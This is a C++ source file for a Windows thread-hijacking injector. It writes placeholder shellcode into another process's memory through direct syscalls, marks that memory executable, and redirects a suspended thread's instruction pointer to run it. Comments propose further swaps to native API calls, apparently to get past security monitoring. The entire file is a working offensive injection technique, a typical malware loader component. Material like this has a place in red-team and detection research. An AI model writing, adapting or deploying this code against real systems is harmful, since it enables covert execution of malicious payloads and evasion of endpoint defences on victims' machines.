#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include "syscalls.h"

int main(int argc, char** argv) {
	
	if (argc < 1) {
		std::cout << "Specify process ID" << "\n" << "Example: Hijack.exe 5725" << "\n";
		exit(1);
	}

	char* PID = argv[1];
	std::cout << "[+] Hijacking process with ID : " << PID << "\n";
	int targetPID = atoi(PID);

	unsigned char shellcode[] = "SHELLCODE HERE";

	SIZE_T shellcode_size = sizeof(shellcode);
	HANDLE targetProcHandle;
	HANDLE threadHijack = NULL;
	HANDLE snapshot;
	PVOID remoteBuffer;
	SIZE_T byteswritten = 0;
	ULONG oldprotect = 0;
	THREADENTRY32 threadentry;
	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;
	threadentry.dwSize = sizeof(THREADENTRY32);

	targetProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)targetPID); // Replace w/ NtOpenProcess
	std::cout << "[+] Opened handle to process" << "\n";
	
	NtAllocateVirtualMemory(targetProcHandle, &remoteBuffer, 0, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	std::cout << "[+] Allocating memory with RW permissions" << "\n";
	
	NtWriteVirtualMemory(targetProcHandle, remoteBuffer, shellcode, sizeof(shellcode), &byteswritten);
	std::cout << "[+] Writing shellcode into memory" << "\n";
	
	NtProtectVirtualMemory(targetProcHandle, &remoteBuffer, &shellcode_size, PAGE_EXECUTE_READ, &oldprotect);
	std::cout << "[+] Changing memory permissions to RX" << "\n";

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadentry);

	while (Thread32Next(snapshot, &threadentry)) {
		if (threadentry.th32OwnerProcessID == targetPID) {
			threadHijack = OpenThread(THREAD_ALL_ACCESS, FALSE, threadentry.th32ThreadID); // Replace w/ NtOpenThread
			std::cout << "[+] Obtained handle to thread" << "\n";
			break;
		}
	}

	NtSuspendThread(threadHijack, NULL);
	printf("[+] Thread suspended\n");

	GetThreadContext(threadHijack, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	
	SetThreadContext(threadHijack, &context);
	std::cout << "[+] Target thread's RIP register pointed at shellcode" << "\n";

	NtResumeThread(threadHijack, NULL);
	std::cout << "[+] Thread Resumed" << "\n";

}
